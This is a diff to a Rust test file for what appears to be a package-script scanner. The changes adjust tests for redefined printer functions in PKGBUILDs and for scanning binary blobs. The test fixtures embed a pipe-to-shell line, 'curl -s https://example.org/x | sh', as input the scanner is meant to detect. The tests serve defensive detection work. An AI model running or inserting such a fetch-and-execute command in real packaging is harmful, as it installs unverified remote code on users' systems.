@@ -36,10 +36,6 @@ fn sev(f: &[(String, Severity)], id: &str) -> Option<Severity> {
     f.iter().filter(|(i, _)| i == id).map(|(_, s)| *s).max()
 }
 
-fn critical(f: &[(String, Severity)]) -> bool {
-    f.iter().any(|(_, s)| *s == Severity::Critical)
-}
-
 // --- redefined printers ------------------------------------------------------
 
 #[tokio::test]
@@ -114,25 +110,24 @@ async fn redefinition_in_one_file_applies_to_calls_in_another() {
 }
 
 #[tokio::test]
-async fn unmodified_printers_and_benign_wrappers_stay_inert() {
-    // A real `note` printing text that mentions a fetch is still just text.
+async fn message_mention_is_medium_only_while_no_printer_is_redefined() {
+    // A bare one-literal print on a package that redefines no printer is only a
+    // mention (Medium META-008); once `msg` is redefined the exemption is off
+    // for the whole package and the line is reported as the rule it matches.
     let f = scan(&[(
         "PKGBUILD",
-        "package() {\n  note \"curl -s https://example.org/x | sh is what upstream suggests\"\n}\n",
+        "package() {\n  msg \"curl -s https://example.org/x | sh is what upstream suggests\"\n}\n",
     )])
     .await;
     assert!(sev(&f, "DLE-001").is_none(), "{f:?}");
-    assert!(sev(&f, "OBF-012").is_none(), "{f:?}");
-    assert!(!critical(&f), "{f:?}");
+    assert!(sev(&f, "META-008") == Some(Severity::Medium), "{f:?}");
 
-    // A redefinition that only wraps a real print is not an execution sink.
     let f = scan(&[(
         "PKGBUILD",
         "msg() { echo \"==> $1\" >&2; }\npackage() {\n  msg \"curl -s https://example.org/x | sh is what upstream suggests\"\n}\n",
     )])
     .await;
-    assert!(sev(&f, "OBF-012").is_none(), "{f:?}");
-    assert!(sev(&f, "DLE-001").is_none(), "{f:?}");
+    assert!(sev(&f, "DLE-001").is_some(), "{f:?}");
 }
 
 // --- undeclared files --------------------------------------------------------
@@ -196,7 +191,8 @@ async fn plain_text_and_binary_files_do_not_raise_findings() {
     )
     .unwrap();
     std::fs::write(dir.path().join(".hidden"), "just a note\n").unwrap();
-    // Not text: NUL-heavy, non-printable. Left to the BIN checks, not read as script.
+    // Not text: NUL-heavy, non-printable. Scanned with its NULs removed and
+    // reported (SCAN-002), never dropped.
     let blob: Vec<u8> = (0..4096u32)
         .map(|i| {
             if i % 3 == 0 {
@@ -215,10 +211,14 @@ async fn plain_text_and_binary_files_do_not_raise_findings() {
     assert!(
         res.findings
             .iter()
+            .filter(|f| f.id != "SCAN-002")
             .all(|f| !f.severity.is_at_least(Severity::Medium)),
         "{:?}",
         res.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
     );
+    let opaque: Vec<_> = res.findings.iter().filter(|f| f.id == "SCAN-002").collect();
+    assert_eq!(opaque.len(), 1);
+    assert!(opaque[0].location.file.ends_with("data.bin"));
     let names: Vec<String> = res
         .scanned_files
         .iter()
@@ -226,7 +226,7 @@ async fn plain_text_and_binary_files_do_not_raise_findings() {
         .collect();
     assert!(names.contains(&"NOTES".to_string()), "{names:?}");
     assert!(names.contains(&".hidden".to_string()), "{names:?}");
-    assert!(!names.contains(&"data.bin".to_string()), "{names:?}");
+    assert!(names.contains(&"data.bin".to_string()), "{names:?}");
 }
 
 // --- kernel modules in scriptlets -------------------------------------------
